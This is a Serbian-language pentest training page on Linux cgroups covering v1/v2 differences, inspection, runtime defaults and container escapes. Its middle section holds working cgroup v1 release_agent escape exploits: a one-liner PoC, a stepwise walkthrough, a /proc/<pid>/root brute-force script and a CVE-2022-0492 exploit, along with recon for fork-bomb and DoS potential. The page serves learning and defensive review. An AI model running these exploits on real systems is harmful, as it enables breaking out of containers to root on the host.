# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

Linux **kontrolne grupe** su kernel mehanizam koji se koristi za grupisanje procesa radi obračuna, ograničavanja, prioritizacije i sprovođenja politika. Ako su namespaces uglavnom o izolaciji pogleda na resurse, cgroups su pre svega o upravljanju **koliko** tih resursa skup procesa može da potroši i, u nekim slučajevima, **koje klase resursa** oni uopšte mogu da koriste. Containers se konstantno oslanjaju na cgroups, čak i kada korisnik nikada ne gleda direktno u njih, jer skoro svaki moderni runtime treba način da kernelu kaže "ovi procesi pripadaju ovom workload-u, i ovo su pravila o resursima koja se na njih primenjuju".

Zato container engines smeštaju novi container u sopstveni cgroup subtree. Kada je stablo procesa tamo, runtime može da ograniči memory, smanji broj PIDs, utiče na CPU usage, reguliše I/O i ograniči pristup uređajima. U produkcionom okruženju, ovo je suštinski važno i za multi-tenant bezbednost i za osnovnu operativnu higijenu. Container bez smislenih kontrole resursa može da iscrpi memory, preplavi sistem procesima ili monopolizuje CPU i I/O na načine koji čine host ili susedne workloads nestabilnim.

Sa aspekta bezbednosti, cgroups su bitne na dva zasebna načina. Prvo, loše ili nedostajuće limits resursa omogućavaju jednostavne denial-of-service napade. Drugo, neke cgroup funkcije, naročito u starijim **cgroup v1** konfiguracijama, istorijski su kreirale moćne breakout primitive kada su bile writable iz unutrašnjosti containera.

## v1 Vs v2

Postoje dva glavna modela cgroup u praksi. **cgroup v1** izlaže više controller hijerarhija, i stariji exploit writeups često se vrte oko čudnih i ponekad previše moćnih semantika dostupnih tamo. **cgroup v2** uvodi jedinstveniju hijerarhiju i generalno čistije ponašanje. Moderni distribucije sve više preferiraju cgroup v2, ali mešovita ili legacy okruženja i dalje postoje, što znači da su oba modela i dalje relevantna pri pregledanju stvarnih sistema.

Razlika je važna jer su neke od najslavnijih container breakout priča, kao što su zloupotrebe **`release_agent`** u cgroup v1, vezane vrlo specifično za starije ponašanje cgroup-a. Čitalac koji vidi cgroup exploit na blogu i zatim ga slepo primeni na moderan sistem koji ima samo cgroup v2 verovatno će pogrešno razumeti šta je zapravo moguće na cilju.

## Inspekcija

Najbrži način da vidite gde se vaša trenutna shell nalazi je:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Fajl `/proc/self/cgroup` prikazuje cgroup putanje povezane sa trenutnim procesom. Na modernom cgroup v2 hostu često ćete videti objedinjeni unos. Na starijim ili hibridnim hostovima možete videti više v1 putanja kontrolera. Kada znate putanju, možete pregledati odgovarajuće fajlove pod `/sys/fs/cgroup` da biste videli ograničenja i trenutnu upotrebu.

Na cgroup v2 hostu sledeće komande su korisne:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ove datoteke otkrivaju koji controllers postoje i koji su delegirani na podređene cgroups. Ovaj model delegiranja je važan u rootless i systemd-managed okruženjima, gde runtime možda može da kontroliše samo podskup cgroup funkcionalnosti koju roditeljska hijerarhija zapravo delegira.

## Lab

Jedan način da se posmatraju cgroups u praksi je da se pokrene container sa ograničenjem memorije:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Takođe možete probati PID-limited container:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ovi primeri su korisni jer pomažu da se poveže runtime flag sa kernel fajl interfejsom. Runtime ne sprovodi pravilo magijom; on upisuje relevantne cgroup postavke i zatim dozvoljava kernelu da ih primeni na stablo procesa.

## Korišćenje runtime-a

Docker, Podman, containerd i CRI-O svi se oslanjaju na cgroups u normalnom radu. Razlike obično nisu u tome da li koriste cgroups, već u tome **koje podrazumevane vrednosti biraju**, **kako komuniciraju sa systemd-om**, **kako rootless delegacija funkcioniše**, i **koliko je konfiguracije kontrolisano na nivou engine-a naspram nivoa orkestracije**.

U Kubernetes-u, resource requests i limits na kraju postaju cgroup konfiguracija na čvoru. Put od Pod YAML-a do kernel enforcement-a prolazi kroz kubelet, CRI runtime i OCI runtime, ali cgroups su i dalje kernel mehanizam koji konačno primenjuje pravilo. U Incus/LXC okruženjima, cgroups su takođe intenzivno korišćeni, naročito zato što system containers često izlažu bogatije stablo procesa i operativna očekivanja slična VM-u.

## Pogrešne konfiguracije i izbijanja iz kontejnera

Klasična cgroup sigurnosna priča je zapisivi **cgroup v1 `release_agent`** mehanizam. U tom modelu, ako bi napadač mogao da upiše u odgovarajuće cgroup fajlove, omogući `notify_on_release`, i kontroliše putanju sačuvanu u `release_agent`, kernel bi mogao završiti izvršavanjem putanje po izboru napadača u initial namespaces na hostu kada bi cgroup postala prazna. Zato stariji izveštaji obraćaju toliko pažnje na upisivost cgroup kontrolera, mount opcije i namespace/capability uslove.

Čak i kada `release_agent` nije dostupan, greške u cgroup konfiguraciji i dalje su važne. Previše širok pristup uređajima može učiniti uređaje hosta dostupnim iz kontejnera. Nedostajući memory i PID limiti mogu jednostavnu izvršnu komandu pretvoriti u DoS hosta. Slaba cgroup delegacija u rootless scenarijima takođe može dovesti do zablude kod odbrambenih timova, navodeći ih da postoji ograničenje koje runtime zapravo nikada nije uspeo da primeni.

### `release_agent` Pozadina

Tehnika `release_agent` važi samo za **cgroup v1**. Osnovna ideja je da kada poslednji proces u nekom cgroup-u izađe i `notify_on_release=1` je podešen, kernel izvršava program čija je putanja sačuvana u `release_agent`. To izvršavanje se dešava u **initial namespaces on the host**, što čini zapisivi `release_agent` primitivom za izbijanje iz kontejnera.

Da bi tehnika radila, napadač obično treba:

- upisivu **cgroup v1** hijerarhiju
- mogućnost da kreira ili koristi child cgroup
- mogućnost da postavi `notify_on_release`
- mogućnost da upiše putanju u `release_agent`
- putanju koja se, sa stanovišta hosta, razrešava u izvršni fajl

### Klasični PoC

Istorijski jednolinijski PoC je:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Ovaj PoC upisuje putanju payload-a u `release_agent`, pokreće cgroup release, i zatim čita izlazni fajl generisan na hostu.

### Readable Walk-Through

Ista ideja je lakša za razumevanje kada se podeli na korake.

1. Kreirajte i pripremite writable cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifikujte putanju na hostu koja odgovara datotečnom sistemu kontejnera:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Ostavi payload koji će biti vidljiv sa host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Pokrenite izvršavanje tako što ćete isprazniti cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Efekat je izvršavanje payload-a na host strani sa host root privilegijama. U pravom exploit-u, payload obično upisuje proof fajl, pokreće reverse shell ili menja stanje host-a.

### Varijanta relativne putanje koristeći `/proc/<pid>/root`

U nekim okruženjima, putanja do container fajl sistema na hostu nije očigledna ili je sakrivena od strane storage driver-a. U tom slučaju putanja payload-a može se izraziti kroz `/proc/<pid>/root/...`, gde je `<pid>` host PID koji pripada procesu u trenutnom container-u. To je osnova relativ-path brute-force varijante:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Relevantna fora ovde nije sama brute force, već oblik putanje: `/proc/<pid>/root/...` omogućava kernelu da razreši fajl u datotečnom sistemu kontejnera iz host namespace-a, čak i kada direktna putanja do host skladišta nije unapred poznata.

### CVE-2022-0492 Varijanta

2022. godine, CVE-2022-0492 je pokazala da upis u `release_agent` u cgroup v1 nije ispravno proveravao `CAP_SYS_ADMIN` u **inicijalnom** user namespace-u. Ovo je tehniku učinilo znatno dostupnijom na ranjivim kernelima, jer proces u kontejneru koji je mogao da montira cgroup hijerarhiju mogao je da upiše `release_agent` bez prethodnih privilegija u host user namespace-u.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Na ranjivom kernelu, host izvršava `/proc/self/exe` sa host root privilegijama.

Za praktičnu zloupotrebu, počnite proverom da li okruženje još uvek izlaže upisive cgroup-v1 putanje ili opasan pristup uređajima:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Ako `release_agent` postoji i može se zapisati, već ste u legacy-breakout teritoriji:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Ako cgroup path sam po sebi ne omogućava escape, sledeća praktična upotreba često je denial of service ili reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
These commands quickly tell you whether the workload has room to fork-bomb, consume memory aggressively, or abuse a writable legacy cgroup interface.

## Provere

Prilikom pregleda cilja, svrha cgroup provera je da se sazna koji cgroup model se koristi, da li kontejner vidi kontrolne putanje koje su zapisive, i da li su stari breakout primitives kao `release_agent` uopšte relevantni.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
What is interesting here:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Omogućeno po defaultu | Containeri se automatski smeštaju u cgroups; ograničenja resursa su opciona osim ako nisu postavljena flagovima | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Omogućeno po defaultu | `--cgroups=enabled` je podrazumevano; cgroup namespace podrazumevana podešavanja variraju po verziji cgroup-a (`private` na cgroup v2, `host` na nekim cgroup v1 podešavanjima) | `--cgroups=disabled`, `--cgroupns=host`, opušten pristup uređajima, `--privileged` |
| Kubernetes | Omogućeno kroz runtime po defaultu | Pods i containeri se smeštaju u cgroups od strane node runtime-a; fino-granularna kontrola resursa zavisi od `resources.requests` / `resources.limits` | izostavljanje resource requests/limits, pristup uređajima sa privilegijama, runtime miskonfiguracija na nivou hosta |
| containerd / CRI-O | Omogućeno po defaultu | cgroups su deo normalnog upravljanja životnim ciklusom | direktne runtime konfiguracije koje opuštaju kontrole uređaja ili izlažu legacy writable cgroup v1 interfejse |

The important distinction is that **cgroup existence** is usually default, while **useful resource constraints** are often optional unless explicitly configured.
